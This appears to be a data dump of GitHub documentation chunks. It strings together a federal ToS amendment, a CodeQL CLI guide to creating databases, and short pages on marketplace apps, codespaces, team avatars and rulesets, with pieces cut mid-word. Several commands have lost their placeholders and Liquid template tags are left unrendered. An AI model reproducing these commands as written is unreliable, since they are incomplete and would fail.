Regulations\n\n1. _Security_ - Company will, in good faith, exercise due diligence using generally accepted commercial business practices for IT security, to ensure that systems are operated and maintained in a secure manner, and that management, operational and technical controls will be employed to ensure security of systems and data. Recognizing the changing nature of the Web, Company will continuously work with users to ensure that its products and services are operated and maintained in a secure manner. Company agrees to discuss implementing additional security controls as deemed necessary by the Government to conform to the Federal Information Security Management Act (FISMA), 44 U.S.C. 3541 et seq.\n\n1. _Federal Records_ - Government acknowledges th", "Y2h1bmtfM19pbmRleF8yMDc0": "at use of Company's site and services may require management of Federal records. Government and user-generated content may meet the definition of Federal records as determined by the agency. If the Company holds Federal records, the Government and the Company must manage Federal records in accordance with all applicable records management laws and regulations, including but not limited to the Federal Records Act (44 U.S.C. chs. 21, 29, 31, 33), and regulations of the National Archives and Records Administration (NARA) at 36 CFR Chapter XII Subchapter B). Managing the records includes, but is not limited to, secure storage, retrievability, and proper disposition of all Federal records including transfer of permanently valuable records to NARA in a format and manner acceptable to NARA at the time of transfer. The Government is responsible for ensuring that the Company is compliant with applicable records management laws and regulations through the life and termination of the Agreement.\n\n\n\nE. General Conditions\n\n1. _Indemnification_ - Any provisions in the ToS related to indemnification, damages, attorney\u2019s fees, and settlement are hereby waived. Liability of the Government for any breach of the ToS or this Agreement, or any claim, demand, suit or proceeding arising from the ToS or this Agreement, shall be determined under the Federal Tort Claims Act, or other governing authority. Liability of Company for any breach of the ToS or this Agreement, or any claim, demand, suit or proceeding arising from the ToS or this Agreement, shall be determined by applicable federal or state law.\n\n1. _Limitation of liability_ - The Parties agree that nothing in the Limitation of Liability clause or elsewhere in the ToS in any way grants Company a waiver from, release of, or limitation of liability pertaining to, any past, current or future violation of federal law.\n\n1. _Governing law and Forum_ - The dispute resolution provision in the ToS is hereby deleted. The ToS and this Amendment shall be governed, interpreted and enforced in a", "Y2h1bmtfNF9pbmRleF8yMDc0": "ccordance with applicable federal laws of the United States of America and exclusive jurisdiction shall be in the appropriate U.S. federal courts. To the extent permitted by federal law, the laws of the State of California will apply in the absence of federal law.\n\n1. _Assignment_ - Neither party may assign its obligations under this Amendment or ToS to any third-party without prior written consent of the other; however, GitHub may, without the Government's consent, assign its obligations to an Government using the service under a free usage plan under this Amendment or ToS to an affiliate or to a successor or acquirer, as the case may be, in connection with a merger, acquisition, corporate reorganization or consolidation, or the sale of all or substantially all of GitHub's assets.\n\n\n\nF. Changes to this agreement\n\n1. _Precedence; Further Amendment; Termination_ - This Amendment constitutes an amendment to the ToS; language in the ToS indicating it may not be modified or that it alone is the entire agreement between the Parties is waived. If there is any conflict between this Amendment and the ToS, or between this Amendment and other rules or policies on the Company site or services, this Amendment shall prevail. This Amendment may be further amended only upon written agreement executed by both Parties. The Government may close its account and terminate this agreement at any time. Company may close Government's account and terminate this agreement on 30 days written notice, but the Government shall not be entitled to a refund of any fees paid.\n\n1. _Posting and availability of this Amendment_ - The parties agree this Amendment contains no confidential or proprietary information, and either party may release it to the public at large.\n\n", "Y2h1bmtfMF9pbmRleF84NTY=": "\n\nAbout preparing your code for analysis\n\n{% data reusables.code-scanning.codeql-cli-version-ghes %}\n\nBefore you analyze your code using {% data variables.product.prodname_codeql %}, you need to create a {% data variables.product.prodname_codeql %} database containing all the data required to run queries on your code. You can create {% data variables.product.prodname_codeql %} databases yourself using the {% data variables.product.prodname_codeql_cli %}.\n\n{% data variables.product.prodname_codeql %} analysis relies on extracting relational data from your code, and using it to build a {% data variables.product.prodname_codeql %} database. {% data variables.product.prodname_codeql %} databases contain all of the important information about a codebase, which can be analyzed by executing {% data variables.product.prodname_codeql %} queries against it.\n\nBefore you generate a {% data variables.product.prodname_codeql %} database, you need to:\n\n1. Install and set up the {% data variables.product.prodname_codeql_cli %}. For more information, see \"AUTOTITLE.\"\n1. Check out the code that you want to analyze:\n   - For a branch, check out the head of the branch that you want to analyze.\n   - For a pull request, check out either the head commit of the pull request, or check out a {% data variables.product.prodname_dotcom %}-generated merge commit of the pull request.\n1. Set up the environment for the codebase, making sure that any dependencies are available. For more information, see \"Creating databases for non-compiled languages\" and \"Creating databases for compiled languages.\"\n1. Find the build command, if any, for the codebase. Typically this is available in a configuration file in the CI system.\n\nOnce the codebase is ready, you can run `codeql database create` to create the database.\n\n\n\nRunning `codeql database create`\n\n{% data variables.product.prodname_codeql %} databases are created by running the following command from the checkout root of your project:\n\n```shell\ncodeql database create  --language=\n```\n\nYou must specif", "Y2h1bmtfMV9pbmRleF84NTY=": "y:\n\n- ``: a path to the new database to be created. This directory will be created when you execute the command\u2014you cannot specify an existing directory.\n- `--language`: the identifier for the language to create a database for. When used with `--db-cluster`, the option accepts a comma-separated list, or can be specified more than once. {% data variables.product.prodname_codeql %} supports creating databases for the following languages:\n\n{% data reusables.code-scanning.codeql-language-identifiers-table %}\n{% data reusables.code-scanning.beta-kotlin-or-swift-support %}\n{% data reusables.code-scanning.beta-ruby-support %}\n\nIf your codebase has a build command or script that invokes the build process, we recommend that you specify it as well:\n\n```shell\n   codeql database create  --command  \\\n         --language=\n   ```\n\nYou can specify additional options depending on the location of your source file, if the code needs to be compiled, and if you want to create {% data variables.product.prodname_codeql %} databases for more than one language.\n\n| Option | Required | Usage |\n|--------|:--------:|-----|\n| `` | {% octicon \"check\" aria-label=\"Required\" %} | Specify the name and location of a directory to create for the {% data variables.product.prodname_codeql %} database. The command will fail if you try to overwrite an existing directory. If you also specify `--db-cluster`, this is the parent directory and a subdirectory is created for each language analyzed. | {% ifversion codeql-language-identifiers-311 %}\n| --language | {% octicon \"check\" aria-label=\"Required\" %} | Specify the identifier for the language to create a database for, one of: {% data reusables.code-scanning.codeql-languages-keywords %}. When used with --db-cluster, the option accepts a comma-separated list, or can be specified more than once. | {% else %}\n| --language | {% octicon \"check\" aria-label=\"Required\" %} | Specify the identifier for the language to create a database for, one of: {% data reusables.code-scanning.codeql-languages-keywords %} (use `jav", "Y2h1bmtfMl9pbmRleF84NTY=": "ascript` to analyze TypeScript code {% ifversion codeql-kotlin-beta %} and `java` to analyze Kotlin code{% endif %}). When used with --db-cluster, the option accepts a comma-separated list, or can be specified more than once. | {% endif %}\n| --command | {% octicon \"x\" aria-label=\"Optional\" %} | **Recommended.** Use to specify the build command or script that invokes the build process for the codebase. Commands are run from the current folder or, where it is defined, from --source-root. Not needed for Python and JavaScript/TypeScript analysis. |\n| --db-cluster | {% octicon \"x\" aria-label=\"Optional\" %} | Use in multi-language codebases to generate one database for each language specified by --language. |\n| --no-run-unnecessary-builds | {% octicon \"x\" aria-label=\"Optional\" %} | **Recommended.** Use to suppress the build command for languages where the {% data variables.product.prodname_codeql_cli %} does not need to monitor the build (for example, Python and JavaScript/TypeScript). |\n| --source-root | {% octicon \"x\" aria-label=\"Optional\" %} | Use if you run the CLI outside the checkout root of the repository. By default, the `database create` command assumes that the current directory is the root directory for the source files, use this option to specify a different location. |\n| --codescanning-config | {% octicon \"x\" aria-label=\"Optional\" %} | Advanced. Use if you have a configuration file that specifies how to create the {% data variables.product.prodname_codeql %} databases and what queries to run in later steps. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\" |\n\nYou can specify extractor options to customize the behavior of extractors that create {% data variables.product.prodname_codeql %} databases. For more information, see\n\"AUTOTITLE.\"\n\nFor full details of all the options you can use when creating databases, see \"AUTOTITLE.\"\n\n\n\nSingle language example\n\nThis example creates a single {% data variables.product.prodname_codeql %} database for the repository checked out at `/checkouts/example-repo`. It use", "Y2h1bmtfM19pbmRleF84NTY=": "s the JavaScript extractor to create a hierarchical representation of the JavaScript and TypeScript code in the repository. The resulting database is stored in `/codeql-dbs/example-repo`.\n\n```shell\n$ codeql database create /codeql-dbs/example-repo --language={% ifversion codeql-language-identifiers-311 %}javascript-typescript{% else %}javascript{% endif %} \\\n    --source-root /checkouts/example-repo\n\n> Initializing database at /codeql-dbs/example-repo.\n> Running command [/codeql-home/codeql/javascript/tools/autobuild.cmd]\n    in /checkouts/example-repo.\n> [build-stdout] Single-threaded extraction.\n> [build-stdout] Extracting\n...\n> Finalizing database at /codeql-dbs/example-repo.\n> Successfully created database at /codeql-dbs/example-repo.\n```\n\n\n\nMultiple language example\n\nThis example creates two {% data variables.product.prodname_codeql %} databases for the repository checked out at `/checkouts/example-repo-multi`. It uses:\n\n- `--db-cluster` to request analysis of more than one language.\n- `--language` to specify which languages to create databases for.\n- `--command` to tell the tool the build command for the codebase, here `make`.\n- `--no-run-unnecessary-builds` to tell the tool to skip the build command for languages where it is not needed (like Python).\n\nThe resulting databases are stored in `python` and `cpp` subdirectories of `/codeql-dbs/example-repo-multi`.\n\n```shell\n$ codeql database create /codeql-dbs/example-repo-multi \\\n    --db-cluster --language python,{% ifversion codeql-language-identifiers-311 %}c-cpp{% else %}cpp{% endif %} \\\n    --command make --no-run-unnecessary-builds \\\n    --source-root /checkouts/example-repo-multi\nInitializing databases at /codeql-dbs/example-repo-multi.\nRunning build command: [make]\n[build-stdout] Calling python3 /codeql-bundle/codeql/python/tools/get_venv_lib.py\n[build-stdout] Calling python3 -S /codeql-bundle/codeql/python/tools/python_tracer.py -v -z all -c /codeql-dbs/example-repo-multi/python/working/trap_cache -p ERROR: 'pip' not installed.\n[build-stdout] /usr/loca", "Y2h1bmtfNF9pbmRleF84NTY=": "l/lib/python3.6/dist-packages -R /checkouts/example-repo-multi\n[build-stdout] [INFO] Python version 3.6.9\n[build-stdout] [INFO] Python extractor version 5.16\n[build-stdout] [INFO] [2] Extracted file /checkouts/example-repo-multi/hello.py in 5ms\n[build-stdout] [INFO] Processed 1 modules in 0.15s\n[build-stdout] \nFinalizing databases at /codeql-dbs/example-repo-multi.\nSuccessfully created databases at /codeql-dbs/example-repo-multi.\n$\n```\n\n\n\nProgress and results\n\nErrors are reported if there are any problems with the options you have specified. For interpreted languages, the extraction progress is displayed in the console. For each source file, the console shows if extraction was successful or if it failed. For compiled languages, the console will display the output of the build system.\n\nWhen the database is successfully created, you\u2019ll find a new directory at the path specified in the command. If you used the `--db-cluster` option to create more than one database, a subdirectory is created for each language. Each {% data variables.product.prodname_codeql %} database directory contains a number of subdirectories, including the relational data (required for analysis) and a source archive\u2014a copy of the source files made at the time the database was created\u2014which is used for displaying analysis results.\n\n\n\nCreating databases for non-compiled languages\n\nThe {% data variables.product.prodname_codeql_cli %} includes extractors to create databases for non-compiled languages\u2014specifically, JavaScript (and TypeScript), Python, and Ruby. These extractors are automatically invoked when you specify JavaScript, Python, or Ruby as the `--language` option when executing `database create`. When creating databases for these languages you must ensure that all additional dependencies are available.\n\n{% note %}\n\n**Note:** When you run `database create` for JavaScript, TypeScript, Python, and Ruby, you should not specify a `--command` option. Otherwise this overrides the normal extractor invocation, which will create an empty database. I", "Y2h1bmtfNV9pbmRleF84NTY=": "f you create databases for multiple languages and one of them is a compiled language, use the `--no-run-unnecessary-builds` option to skip the command for the languages that don\u2019t need to be compiled.\n\n{% endnote %}\n\n\n\nJavaScript and TypeScript\n\nCreating databases for JavaScript requires no additional dependencies, but if the project includes TypeScript files, you must install Node.js 6.x or later. In the command line you can specify `--language={% ifversion codeql-language-identifiers-311 %}javascript-typescript{% else %}javascript{% endif %}` to extract both JavaScript and TypeScript files:\n\n```shell\ncodeql database create --language={% ifversion codeql-language-identifiers-311 %}javascript-typescript{% else %}javascript{% endif %} --source-root  /javascript-database\n```\n\nHere, we have specified a `--source-root` path, which is the location where database creation is executed, but is not necessarily the checkout root of the codebase.\n\nBy default, files in `node_modules` and `bower_components` directories are not extracted.\n\n\n\nPython\n\nWhen creating databases for Python you must ensure:\n\n- You have Python 3 installed and available to the {% data variables.product.prodname_codeql %} extractor.\n- You have the version of Python used by your code installed.\n- You have access to the pip packaging management system and can install any packages that the codebase depends on.\n- You have installed the virtualenv pip module.\n\nIn the command line you must specify `--language=python`. For example:\n\n```shell\ncodeql database create --language=python /python-database\n```\n\nThis executes the `database create` subcommand from the code\u2019s checkout root, generating a new Python database at `/python-database`.\n\n\n\nRuby\n\nCreating databases for Ruby requires no additional dependencies. In the command line you must specify `--language=ruby`. For example:\n\n```shell\ncodeql database create --language=ruby --source-root  /ruby-database\n```\n\nHere, we have specified a `--source-root` path, which is the location where database creation is execute", "Y2h1bmtfNl9pbmRleF84NTY=": "d, but is not necessarily the checkout root of the codebase.\n\n\n\nCreating databases for compiled languages\n\nFor compiled languages, {% data variables.product.prodname_codeql %} needs to invoke the required build system to generate a database, therefore the build method must be available to the CLI.\n\n\n\nDetecting the build system\n\nThe {% data variables.product.prodname_codeql_cli %} includes autobuilders for {% data variables.code-scanning.compiled_languages %} code. {% data variables.product.prodname_codeql %} autobuilders allow you to build projects for compiled languages without specifying any build commands. When an autobuilder is invoked, {% data variables.product.prodname_codeql %} examines the source for evidence of a build system and attempts to run the optimal set of commands required to extract a database. For more information, see \"AUTOTITLE.\"\n\nAn autobuilder is invoked automatically when you execute `codeql database create` for a compiled `--language` if you don\u2019t include a\n`--command` option. For example, for a Java codebase, you would simply run:\n\n```shell\ncodeql database create --language={% ifversion codeql-language-identifiers-311 %}java-kotlin{% else %}java{% endif %} /java-database\n```\n\nIf a codebase uses a standard build system, relying on an autobuilder is often the simplest way to create a database. For sources that require non-standard build steps, you may need to explicitly define each step in the command line.\n\n{% note %}\n\n**Notes:**\n\n- If you are building a Go database, install the Go toolchain (version 1.11 or later) and, if there are dependencies, the appropriate dependency manager (such as dep).\n- The Go autobuilder attempts to automatically detect code written in Go in a repository, and only runs build scripts in an attempt to fetch dependencies. To force {% data variables.product.prodname_codeql %} to limit extraction to the files compiled by your build script, set the environment variable `CODEQL_EXTRACTOR_GO_BUILD_TRACING=on` or use the `--command` option to specify a build command.\n", "Y2h1bmtfN19pbmRleF84NTY=": "\n{% endnote %}\n\n\n\nSpecifying build commands\n\nThe following examples are designed to give you an idea of some of the build commands that you can specify for compiled languages.\n\n{% note %}\n\n**Note:** The `--command` option accepts a single argument\u2014if you need to use more than one command, specify `--command` multiple times. If you need to pass subcommands and options, the whole argument needs to be quoted to be interpreted correctly.\n\n{% endnote %}\n\n- C/C++ project built using `make`:\n\n  ```shell\n  codeql database create cpp-database --language={% ifversion codeql-language-identifiers-311 %}c-cpp{% else %}cpp{% endif %} --command=make\n  ```\n\n- C# project built using `dotnet build`:\n\n  It is a good idea to add `/t:rebuild` to ensure that all code will be built, or do a prior `dotnet clean` (code that is not built will not be included in the {% data variables.product.prodname_codeql %} database):\n\n  ```shell\n  codeql database create csharp-database --language=csharp --command='dotnet build /t:rebuild'\n  ```\n\n- Go project built using the `CODEQL_EXTRACTOR_GO_BUILD_TRACING=on` environment variable:\n\n  ```shell\n  CODEQL_EXTRACTOR_GO_BUILD_TRACING=on codeql database create go-database --language=go\n  ```\n\n- Go project built using a custom build script:\n\n  ```shell\n  codeql database create go-database --language=go --command='./scripts/build.sh'\n  ```\n\n- Java project built using Gradle:\n\n  ```shell\n  # Use `--no-daemon` because a build delegated to an existing daemon cannot be detected by CodeQL.\n  # To ensure isolated builds without caching, add `--no-build-cache` on persistent machines.  \n  codeql database create java-database --language={% ifversion codeql-language-identifiers-311 %}java-kotlin{% else %}java{% endif %} --command='gradle --no-daemon clean test'\n  ```\n\n- Java project built using Maven:\n\n  ```shell\n  codeql database create java-database --language={% ifversion codeql-language-identifiers-311 %}java-kotlin{% else %}java{% endif %} --command='mvn clean install'\n  ```\n\n- Java project built using Ant:\n\n  ``", "Y2h1bmtfOF9pbmRleF84NTY=": "`shell\n  codeql database create java-database --language={% ifversion codeql-language-identifiers-311 %}java-kotlin{% else %}java{% endif %} --command='ant -f build.xml'\n  ```\n\n{% ifversion codeql-swift-beta %}\n- Swift project built from an Xcode project or workspace. By default, the largest Swift target is built:\n\n  It's a good idea to ensure that the project is in a clean state and that there are no build artefacts available.\n\n  ```shell\n  xcodebuild clean -all\n  codeql database create -l swift swift-database\n  ```\n\n- Swift project built with `swift build`:\n\n  ```shell\n  codeql database create -l swift -c \"swift build\" swift-database\n  ```\n\n- Swift project built with `xcodebuild`:\n\n  ```shell\n  codeql database create -l swift -c \"xcodebuild build -target your-target\" swift-database\n  ```\n\n  You can pass the `archive` and `test` options to `xcodebuild`. However, the standard `xcodebuild` command is recommended as it should be the fastest, and should be all that {% data variables.product.prodname_codeql %} requires for a successful scan.\n\n- Swift project built using a custom build script:\n\n  ```shell\n  codeql database create -l swift -c \"./scripts/build.sh\" swift-database\n  ```\n\n{% endif %}\n\n- Project built using Bazel:\n\n  ```shell\n  # Navigate to the Bazel workspace.\n\n  # Before building, remove cached objects\n  # and stop all running Bazel server processes.\n  bazel clean --expunge\n\n  # Build using the following Bazel flags, to help {% data variables.product.prodname_codeql %} detect the build:\n  # `--spawn_strategy=local`: build locally, instead of using a distributed build\n  # `--nouse_action_cache`: turn off build caching, which might prevent recompilation of source code\n  # `--noremote_accept_cached`, `--noremote_upload_local_results`: avoid using a remote cache\n  codeql database create new-database --language= \\\n  --command='bazel build --spawn_strategy=local --nouse_action_cache --noremote_accept_cached --noremote_upload_local_results //path/to/package:target'\n\n  # After building, stop all running Bazel se", "Y2h1bmtfOV9pbmRleF84NTY=": "rver processes.\n  # This ensures future build commands start in a clean Bazel server process\n  # without {% data variables.product.prodname_codeql %} attached.\n  bazel shutdown\n  ```\n\n- Project built using a custom build script:\n\n  ```shell\n  codeql database create new-database --language= --command='./scripts/build.sh'\n  ```\n\nThis command runs a custom script that contains all of the commands required to build the project.\n\n\n\n\n\n\n\nUsing indirect build tracing\n\nIf the {% data variables.product.prodname_codeql_cli %} autobuilders for compiled languages do not work with your CI workflow and you cannot wrap invocations of build commands with `codeql database trace-command`, you can use indirect build tracing to create a {% data variables.product.prodname_codeql %} database. To use indirect build tracing, your CI system must be able to set custom environment variables for each build action.\n\nTo create a {% data variables.product.prodname_codeql %} database with indirect build tracing, run the following command from the checkout root of your project:\n\n```shell\ncodeql database init ... --begin-tracing \n```\n\nYou must specify:\n\n- ``: a path to the new database to be created. This directory will be created when you execute the command\u2014you cannot specify an existing directory.\n- `--begin-tracing`: creates scripts that can be used to set up an environment in which build commands will be traced.\n\nYou may specify other options for the `codeql database init` command as normal.\n\n{% note %}\n\n**Note:** If the build runs on Windows, you must set either `--trace-process-level ` or `--trace-process-name ` so that the option points to a parent CI process that will observe all build steps for the code being analyzed.\n\n{% endnote %}\n\nThe `codeql database init` command will output a message:\n\n```shell\nCreated skeleton . This in-progress database is ready to be populated by an extractor. In order to initialise tracing, some environment variables need to be set in the shell your build will run in. A number of scripts to do this have been c", "Y2h1bmtfMTBfaW5kZXhfODU2": "reated in /temp/tracingEnvironment. Please run one of these scripts before invoking your build command.\n\nBased on your operating system, we recommend you run: ...\n```\n\nThe `codeql database init` command creates `/temp/tracingEnvironment` with files that contain environment variables and values that will enable {% data variables.product.prodname_codeql %} to trace a sequence of build steps. These files are named `start-tracing.{json,sh,bat,ps1}`. Use one of these files with your CI system\u2019s mechanism for setting environment variables for future steps. You can:\n\n- Read the JSON file, process it, and print out environment variables in the format expected by your CI system. For example, Azure DevOps expects `echo \"##vso[task.setvariable variable=NAME]VALUE\"`.\n- Or, if your CI system persists the environment,  source the appropriate `start-tracing` script to set the {% data variables.product.prodname_codeql %} variables in the shell environment of the CI system.\n\nBuild your code; optionally, unset the environment variables using an `end-tracing.{json,sh,bat,ps1}` script from the directory where the `start-tracing` scripts are stored; and then run the command `codeql database finalize `.\n\nOnce you have created a {% data variables.product.prodname_codeql %} database using indirect build tracing, you can work with it like any other {% data variables.product.prodname_codeql %} database. For example, analyze the database, and upload the results to {% data variables.product.prodname_dotcom %} if you use code scanning.\n\n\n\nExample of creating a {% data variables.product.prodname_codeql %} database using indirect build tracing\n\n{% ifversion ghas-for-azure-devops %}\n{% note %}\n\n**Note:** If you use Azure DevOps pipelines, the simplest way to create a {% data variables.product.prodname_codeql %} database is to use {% data variables.product.prodname_ghas_azdo %}. For documentation, see Configure {% data variables.product.prodname_ghas_azdo %} in Microsoft Learn.\n\n{% endnote %}\n{% endif %}\n\nThe following example shows how you coul", "Y2h1bmtfMTFfaW5kZXhfODU2": "d use indirect build tracing in an Azure DevOps pipeline to create a {% data variables.product.prodname_codeql %} database:\n\n```yaml\nsteps:\n    # Download the {% data variables.product.prodname_codeql_cli %} and query packs...\n    # Check out the repository ...\n\n    # Run any pre-build tasks, for example, restore NuGet dependencies...\n\n    # Initialize the {% data variables.product.prodname_codeql %} database.\n    # In this example, the {% data variables.product.prodname_codeql_cli %} has been downloaded and placed on the PATH.\n    - task: CmdLine@1\n       displayName: Initialize {% data variables.product.prodname_codeql %} database\n      inputs:\n          # Assumes the source code is checked out to the current working directory.\n          # Creates a database at `/db`.\n          # Running on Windows, so specifies a trace process level.\n          script: \"codeql database init --language csharp --trace-process-name Agent.Worker.exe --source-root . --begin-tracing db\"\n\n    # Read the generated environment variables and values,\n    # and set them so they are available for subsequent commands\n    # in the build pipeline. This is done in PowerShell in this example.\n    - task: PowerShell@1\n       displayName: Set {% data variables.product.prodname_codeql %} environment variables\n       inputs:\n          targetType: inline\n          script: >\n             $json = Get-Content $(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/start-tracing.json | ConvertFrom-Json\n             $json.PSObject.Properties | ForEach-Object {\n                 $template = \"##vso[task.setvariable variable=\"\n                 $template += $_.Name\n                 $template += \"]\"\n                 $template += $_.Value\n                 echo \"$template\"\n             }\n\n    # Execute the pre-defined build step. Note the `msbuildArgs` variable.\n    - task: VSBuild@1\n        inputs:\n          solution: '**/*.sln'\n          msbuildArgs: /p:OutDir=$(Build.ArtifactStagingDirectory)\n          platform: Any CPU\n          configuration: Release\n  ", "Y2h1bmtfMTJfaW5kZXhfODU2": "        # Execute a clean build, in order to remove any existing build artifacts prior to the build.\n          clean: True\n       displayName: Visual Studio Build\n\n    # Read and set the generated environment variables to end build tracing. This is done in PowerShell in this example.\n    - task: PowerShell@1\n       displayName: Clear {% data variables.product.prodname_codeql %} environment variables\n       inputs:\n          targetType: inline\n          script: >\n             $json = Get-Content $(System.DefaultWorkingDirectory)/db/temp/tracingEnvironment/end-tracing.json | ConvertFrom-Json\n             $json.PSObject.Properties | ForEach-Object {\n                 $template = \"##vso[task.setvariable variable=\"\n                 $template += $_.Name\n                 $template += \"]\"\n                 $template += $_.Value\n                 echo \"$template\"\n             }\n\n    - task: CmdLine@2\n       displayName: Finalize {% data variables.product.prodname_codeql %} database\n       inputs:\n          script: 'codeql database finalize db'\n\n    # Other tasks go here, for example:\n    # `codeql database analyze`\n    # then `codeql github upload-results` ...\n```\n\n\n\nNext steps\n\n- To learn how to use the {% data variables.product.prodname_codeql_cli %} to analyze the database you created from your code, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF81NjE=": "\n\nAbout installing {% data variables.product.prodname_oauth_apps %} in your personal account\n\n{% data reusables.marketplace.marketplace-apps-only %}\n\nIf you choose a paid plan, you'll pay for your app subscription on your personal account's current billing date using your existing payment method.\n\n{% data reusables.marketplace.free-trials %}\n\nFor more information about installing a {% data variables.product.prodname_github_app %}, see \"AUTOTITLE.\"\n\n\n\nInstalling an {% data variables.product.prodname_oauth_app %} in your personal account\n\n{% data reusables.saml.saml-session-oauth %}\n\n{% data reusables.marketplace.visit-marketplace %}\n{% data reusables.marketplace.browse-to-app %}\n{% data reusables.marketplace.choose-plan %}\n{% data reusables.marketplace.install-buy %}\n{% data reusables.marketplace.confirm-install-account-personal %}\n{% data reusables.marketplace.add-payment-method-personal %}\n{% data reusables.marketplace.complete-order-begin-installation %}\n1. Review the information about the app's access to your personal account and data, then click **Authorize application**.\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xMDQz": "\n\nCodespace names\n\nEach codespace has a unique name that is a combination of your {% data variables.product.company_short %} handle, two or three automatically generated words, and some random characters. For example: `octocat-literate-space-parakeet-mld5`. The two or three automatically generated words also form the initial display name of your codespace, in this case, `literate-space-parakeet`. You can change the display name for a codespace, but this will not affect the permanent name. For more information, see \"AUTOTITLE.\"\n\nTo find the name of a codespace:\n\n- Open the codespace in the browser. The subdomain of the URL is the name of the codespace. For example: `https://octocat-literate-space-parakeet-mld5.github.dev` is the URL for the `octocat-literate-space-parakeet-mld5` codespace.\n- If you cannot open a codespace, you can access the name in {% data variables.product.product_name %} on https://github.com/codespaces. The name is shown in a pop-up when you hover over the display name of a codespace on https://github.com/codespaces.\n\n  !Screenshot of the mouse pointer positioned over a display name and the related codespace name shown at the bottom of the browser page.\n\nThe name the codespace is also included in many of the log files. For example, in the codespace logs as the value of `friendlyName`, in the {% data variables.product.prodname_github_codespaces %} extension log after `making GET request for`, and in the browser console log after `clientUrl`. For more information, see \"AUTOTITLE.\"\n\n\n\nCodespaces IDs\n\nEvery codespace also has an ID (identifier). This is not shown by default in {% data variables.product.prodname_vscode %} so you may need to update the settings for the {% data variables.product.prodname_github_codespaces %} extension before you can access the ID.\n\n1. In {% data variables.product.prodname_vscode %}, browser or desktop, in the Activity Bar on the left, click **Remote Explorer** to show details for the codespace.\n{% indented_data_reference reusables.codespaces.remote-explorer spaces=3 ", "Y2h1bmtfMV9pbmRleF8xMDQz": "%}\n1. If the side bar includes a \"Codespace Performance\" section, hover over the \"Codespace ID\" and click the clipboard icon to copy the ID.\n1. If the information is not shown, click {% octicon \"gear\" aria-label=\"Manage\" %}, in the bottom-left corner of the Activity Bar, to display the \"Settings\" tab.\n1. Expand **Extensions** and click **{% data variables.product.prodname_github_codespaces %}** to display the settings for the extension. Then enable **Show Performance Explorer** to display the \"Codespace Performance\" section in the side bar.\n\n   !Screenshot of \"Show Performance Explorer\" selected in {% data variables.product.prodname_vscode_shortname %}'s \"Settings\" tab and a codespace ID highlighted in the \"Remote Explorer\" side bar.\n\n", "Y2h1bmtfMF9pbmRleF81MzM=": "\n\nStep 1. Pricing plan change event\n\nGitHub send the `marketplace_purchase` webhook with the `changed` action to your app, when a customer makes any of these changes to their {% data variables.product.prodname_marketplace %} order:\n- Upgrades to a more expensive pricing plan or downgrades to a lower priced plan.\n- Adds or removes seats to their existing plan.\n- Changes the billing cycle.\n\nGitHub will send the webhook when the change takes effect. For example, when a customer downgrades a plan, GitHub sends the webhook at the end of the customer's billing cycle. GitHub sends a webhook to your app immediately when a customer upgrades their plan to allow them access to the new service right away. If a customer switches from a monthly to a yearly billing cycle, it's considered an upgrade. See \"AUTOTITLE\" to learn more about what actions are considered an upgrade or downgrade.\n\nRead the `effective_date`, `marketplace_purchase`, and `previous_marketplace_purchase` from the `marketplace_purchase` webhook to update the plan's start date and make changes to the customer's billing cycle and pricing plan. See \"AUTOTITLE\" for an example of the `marketplace_purchase` event payload.\n\nIf your app offers free trials, you'll receive the `marketplace_purchase` webhook with the `changed` action when the free trial expires. If the customer's free trial expires, upgrade the customer to the paid version of the free-trial plan.\n\n\n\nStep 2. Updating customer accounts\n\nYou'll need to update the customer's account information to reflect the billing cycle and pricing plan changes the customer made to their {% data variables.product.prodname_marketplace %} order. Display upgrades to the pricing plan, `seat_count` (for per-unit pricing plans), and billing cycle on your Marketplace app's website or your app's UI when you receive the `changed` action webhook.\n\nWhen a customer downgrades a plan, it's recommended to review whether a customer has exceeded their plan limits and engage with them directly in your UI or by reaching out to them by phon", "Y2h1bmtfMV9pbmRleF81MzM=": "e or email.\n\nTo encourage people to upgrade you can display an upgrade URL in your app's UI. See \"About upgrade URLs\" for more details.\n\n{% note %}\n\n**Note:** We recommend performing a periodic synchronization using `GET /marketplace_listing/plans/:id/accounts` to ensure your app has the correct plan, billing cycle information, and unit count (for per-unit pricing) for each account.\n\n{% endnote %}\n\n\n\nFailed upgrade payments\n\n{% data reusables.marketplace.marketplace-failed-purchase-event %}\n\n\n\nAbout upgrade URLs\n\nYou can redirect users from your app's UI to upgrade on GitHub using an upgrade URL:\n\n```text\nhttps://www.github.com/marketplace//upgrade//\n```\n\nFor example, if you notice that a customer is on a 5 person plan and needs to move to a 10 person plan, you could display a button in your app's UI that says \"Here's how to upgrade\" or show a banner with a link to the upgrade URL. The upgrade URL takes the customer to your listing plan's upgrade confirmation page.\n\nUse the `LISTING_PLAN_NUMBER` for the plan the customer would like to purchase. When you create new pricing plans they receive a `LISTING_PLAN_NUMBER`, which is unique to each plan across your listing, and a `LISTING_PLAN_ID`, which is unique to each plan in the {% data variables.product.prodname_marketplace %}. You can find these numbers when you List plans, which identifies your listing's pricing plans. Use the `LISTING_PLAN_ID` and the \"AUTOTITLE\" endpoint to get the `CUSTOMER_ACCOUNT_ID`.\n\n{% note %}\n\n**Note:** If your customer upgrades to additional units (such as seats), you can still send them to the appropriate plan for their purchase, but we are unable to support `unit_count` parameters at this time.\n\n{% endnote %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjE3": "---\ntitle: Setting your team's profile picture\nintro: 'Team maintainers and organization owners can set a profile picture for a team, which is displayed on the team''s page.'\nredirect_from:\n  - /articles/setting-your-team-s-profile-picture\n  - /articles/setting-your-teams-profile-picture\n  - /github/setting-up-and-managing-organizations-and-teams/setting-your-teams-profile-picture\nversions:\n  fpt: '*'\n  ghes: '*'\n  ghae: '*'\n  ghec: '*'\ntopics:\n  - Organizations\n  - Teams\nshortTitle: Team profile picture\n---\nUnless you set a profile picture for a team, the team profile picture will match the organization's profile picture.\n\n{% data reusables.profile.access_org %}\n{% data reusables.user-settings.access_org %}\n{% data reusables.organizations.specific_team %}\n{% data reusables.organizations.team_settings %}\n1. Under \"Profile picture\", click **Upload new picture**, then select your desired profile picture.\n1. Click and drag to crop the image as needed, then click **Set new team avatar**.\n\n", "Y2h1bmtfMF9pbmRleF8xNzM1": "\n\nViewing rulesets for a repository\n\nAnyone with read access to a repository can view the rulesets targeting the repository. This can be useful if you want to know why you can't commit to a branch. On the 